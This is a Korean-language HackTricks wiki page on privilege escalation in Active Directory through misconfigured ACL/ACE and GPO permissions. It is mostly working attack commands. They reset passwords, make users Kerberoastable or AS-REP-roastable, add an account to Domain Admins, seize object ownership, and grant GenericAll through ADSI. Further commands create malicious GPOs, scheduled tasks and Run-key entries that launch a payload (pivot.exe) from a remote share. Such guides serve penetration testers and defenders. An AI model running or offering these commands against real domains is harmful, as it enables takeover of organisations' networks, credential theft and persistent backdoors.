# Active Directory ACL/ACE 악용

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}

**이 페이지는 주로** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **와** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**의 기술 요약입니다. 더 자세한 내용은 원본 기사를 확인하세요.**

## **사용자에 대한 GenericAll 권한**

이 권한은 공격자에게 대상 사용자 계정에 대한 완전한 제어를 부여합니다. `Get-ObjectAcl` 명령을 사용하여 `GenericAll` 권한이 확인되면, 공격자는 다음을 수행할 수 있습니다:

* **대상의 비밀번호 변경**: `net user <username> <password> /domain`을 사용하여 공격자는 사용자의 비밀번호를 재설정할 수 있습니다.
* **대상 Kerberoasting**: 사용자의 계정에 SPN을 할당하여 kerberoastable하게 만든 후, Rubeus와 targetedKerberoast.py를 사용하여 티켓 부여 티켓(TGT) 해시를 추출하고 크랙을 시도합니다.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
* **Targeted ASREPRoasting**: 사용자의 사전 인증을 비활성화하여 해당 계정을 ASREPRoasting에 취약하게 만듭니다.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll 권한이 있는 그룹**

이 권한은 공격자가 `Domain Admins`와 같은 그룹에 `GenericAll` 권한이 있을 경우 그룹 멤버십을 조작할 수 있게 해줍니다. `Get-NetGroup`을 사용하여 그룹의 고유 이름을 식별한 후, 공격자는:

* **자신을 Domain Admins 그룹에 추가**: 이는 직접 명령을 사용하거나 Active Directory 또는 PowerSploit와 같은 모듈을 사용하여 수행할 수 있습니다.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

이러한 권한을 컴퓨터 객체 또는 사용자 계정에서 보유하면 다음을 수행할 수 있습니다:

* **Kerberos Resource-based Constrained Delegation**: 컴퓨터 객체를 장악할 수 있습니다.
* **Shadow Credentials**: 이 기술을 사용하여 그림자 자격 증명을 생성할 수 있는 권한을 악용하여 컴퓨터 또는 사용자 계정을 가장할 수 있습니다.

## **WriteProperty on Group**

사용자가 특정 그룹(예: `Domain Admins`)의 모든 객체에 대해 `WriteProperty` 권한을 가지고 있다면, 그들은:

* **자신을 Domain Admins 그룹에 추가**: `net user`와 `Add-NetGroupUser` 명령을 결합하여 이 방법을 통해 도메인 내에서 권한 상승을 할 수 있습니다.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

이 권한은 공격자가 `Domain Admins`와 같은 특정 그룹에 자신을 추가할 수 있게 해줍니다. 그룹 멤버십을 직접 조작하는 명령을 통해 가능합니다. 다음 명령 시퀀스를 사용하면 자기 추가가 가능합니다:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

유사한 권한으로, 공격자는 해당 그룹에 대한 `WriteProperty` 권한이 있는 경우 그룹 속성을 수정하여 자신을 직접 그룹에 추가할 수 있습니다. 이 권한의 확인 및 실행은 다음과 함께 수행됩니다:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password`에 대한 사용자의 `ExtendedRight`를 보유하면 현재 비밀번호를 알지 못하고도 비밀번호를 재설정할 수 있습니다. 이 권한의 검증 및 악용은 PowerShell 또는 대체 명령줄 도구를 통해 수행할 수 있으며, 대화형 세션 및 비대화형 환경을 위한 원라이너를 포함하여 사용자의 비밀번호를 재설정하는 여러 방법을 제공합니다. 명령은 간단한 PowerShell 호출에서 Linux의 `rpcclient` 사용에 이르기까지 다양하여 공격 벡터의 다재다능함을 보여줍니다.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **그룹에 대한 WriteOwner**

공격자가 그룹에 대해 `WriteOwner` 권한을 가지고 있음을 발견하면, 그룹의 소유권을 자신으로 변경할 수 있습니다. 이는 해당 그룹이 `Domain Admins`인 경우 특히 영향력이 큽니다. 소유권을 변경하면 그룹 속성과 구성원에 대한 더 넓은 제어가 가능해집니다. 이 과정은 `Get-ObjectAcl`을 통해 올바른 객체를 식별한 다음, `Set-DomainObjectOwner`를 사용하여 SID 또는 이름으로 소유자를 수정하는 것을 포함합니다.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

이 권한은 공격자가 사용자 속성을 수정할 수 있게 해줍니다. 특히, `GenericWrite` 접근 권한을 통해 공격자는 사용자의 로그온 스크립트 경로를 변경하여 사용자가 로그온할 때 악성 스크립트를 실행할 수 있습니다. 이는 `Set-ADObject` 명령을 사용하여 대상 사용자의 `scriptpath` 속성을 공격자의 스크립트를 가리키도록 업데이트함으로써 달성됩니다.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

이 권한을 통해 공격자는 그룹 구성원을 조작할 수 있으며, 예를 들어 자신이나 다른 사용자를 특정 그룹에 추가할 수 있습니다. 이 과정은 자격 증명 객체를 생성하고, 이를 사용하여 그룹에서 사용자를 추가하거나 제거하며, PowerShell 명령어로 구성원 변경 사항을 확인하는 것을 포함합니다.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

AD 객체를 소유하고 그에 대한 `WriteDACL` 권한을 가지면 공격자는 자신에게 해당 객체에 대한 `GenericAll` 권한을 부여할 수 있습니다. 이는 ADSI 조작을 통해 이루어지며, 객체에 대한 완전한 제어와 그룹 구성원 자격을 수정할 수 있는 능력을 제공합니다. 그럼에도 불구하고 Active Directory 모듈의 `Set-Acl` / `Get-Acl` cmdlet을 사용하여 이러한 권한을 악용하려고 할 때 제한이 존재합니다.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **도메인에서의 복제 (DCSync)**

DCSync 공격은 도메인에서 특정 복제 권한을 활용하여 도메인 컨트롤러를 모방하고 사용자 자격 증명을 포함한 데이터를 동기화합니다. 이 강력한 기술은 공격자가 도메인 컨트롤러에 직접 접근하지 않고도 AD 환경에서 민감한 정보를 추출할 수 있도록 하는 `DS-Replication-Get-Changes`와 같은 권한을 요구합니다. [**DCSync 공격에 대해 더 알아보세요.**](../dcsync.md)

## GPO 위임 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO 위임

그룹 정책 객체(GPO)를 관리하기 위한 위임된 접근은 상당한 보안 위험을 초래할 수 있습니다. 예를 들어, `offense\spotless`와 같은 사용자가 GPO 관리 권한을 위임받으면 **WriteProperty**, **WriteDacl**, **WriteOwner**와 같은 권한을 가질 수 있습니다. 이러한 권한은 PowerView를 사용하여 악의적인 목적으로 남용될 수 있습니다: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO 권한 열거

잘못 구성된 GPO를 식별하기 위해 PowerSploit의 cmdlet을 연결하여 사용할 수 있습니다. 이를 통해 특정 사용자가 관리할 수 있는 GPO를 발견할 수 있습니다: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**적용된 정책이 있는 컴퓨터**: 특정 GPO가 적용된 컴퓨터를 확인할 수 있어 잠재적 영향 범위를 이해하는 데 도움이 됩니다. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**특정 컴퓨터에 적용된 정책**: 특정 컴퓨터에 적용된 정책을 보려면 `Get-DomainGPO`와 같은 명령을 사용할 수 있습니다.

**적용된 정책이 있는 OU**: 특정 정책의 영향을 받는 조직 단위(OU)를 식별하기 위해 `Get-DomainOU`를 사용할 수 있습니다.

### GPO 남용 - New-GPOImmediateTask

잘못 구성된 GPO는 즉시 예약된 작업을 생성하여 코드를 실행하는 데 악용될 수 있습니다. 이는 영향을 받는 머신에서 로컬 관리자 그룹에 사용자를 추가하여 권한을 크게 상승시킬 수 있습니다:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy 모듈 - GPO 남용

GroupPolicy 모듈이 설치된 경우, 새로운 GPO를 생성하고 연결하며, 영향을 받는 컴퓨터에서 백도어를 실행하기 위한 레지스트리 값과 같은 설정을 할 수 있습니다. 이 방법은 GPO가 업데이트되고 사용자가 컴퓨터에 로그인해야 실행됩니다:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO 악용

SharpGPOAbuse는 새로운 GPO를 생성할 필요 없이 기존 GPO를 악용하여 작업을 추가하거나 설정을 수정하는 방법을 제공합니다. 이 도구는 변경 사항을 적용하기 전에 기존 GPO를 수정하거나 RSAT 도구를 사용하여 새로운 GPO를 생성해야 합니다:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### 강제 정책 업데이트

GPO 업데이트는 일반적으로 약 90분마다 발생합니다. 이 프로세스를 가속화하기 위해, 특히 변경 사항을 구현한 후에는 대상 컴퓨터에서 `gpupdate /force` 명령을 사용하여 즉각적인 정책 업데이트를 강제할 수 있습니다. 이 명령은 GPO에 대한 모든 수정 사항이 다음 자동 업데이트 주기를 기다리지 않고 적용되도록 보장합니다.

### 내부 구조

주어진 GPO의 예약된 작업을 검사하면, `Misconfigured Policy`와 같은 작업에 `evilTask`와 같은 작업이 추가된 것을 확인할 수 있습니다. 이러한 작업은 시스템 동작을 수정하거나 권한을 상승시키기 위한 스크립트 또는 명령줄 도구를 통해 생성됩니다.

`New-GPOImmediateTask`에 의해 생성된 XML 구성 파일에 표시된 작업의 구조는 예약된 작업의 세부 사항을 설명합니다 - 실행할 명령과 그 트리거를 포함합니다. 이 파일은 GPO 내에서 예약된 작업이 정의되고 관리되는 방식을 나타내며, 정책 집행의 일환으로 임의의 명령이나 스크립트를 실행하는 방법을 제공합니다.

### 사용자 및 그룹

GPO는 또한 대상 시스템에서 사용자 및 그룹 구성원의 조작을 허용합니다. 사용자 및 그룹 정책 파일을 직접 편집함으로써 공격자는 로컬 `administrators` 그룹과 같은 특권 그룹에 사용자를 추가할 수 있습니다. 이는 GPO 관리 권한의 위임을 통해 가능하며, 이는 정책 파일을 수정하여 새로운 사용자를 포함하거나 그룹 구성원을 변경할 수 있도록 허용합니다.

사용자 및 그룹에 대한 XML 구성 파일은 이러한 변경 사항이 어떻게 구현되는지를 설명합니다. 이 파일에 항목을 추가함으로써 특정 사용자에게 영향을 받는 시스템에서 상승된 권한을 부여할 수 있습니다. 이 방법은 GPO 조작을 통한 권한 상승에 대한 직접적인 접근 방식을 제공합니다.

또한, 로그온/로그오프 스크립트를 활용하거나, 자동 실행을 위한 레지스트리 키를 수정하거나, .msi 파일을 통해 소프트웨어를 설치하거나, 서비스 구성을 편집하는 등의 코드를 실행하거나 지속성을 유지하기 위한 추가 방법도 고려될 수 있습니다. 이러한 기술은 GPO의 남용을 통해 접근을 유지하고 대상 시스템을 제어하는 다양한 경로를 제공합니다.

## 참고 문헌

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
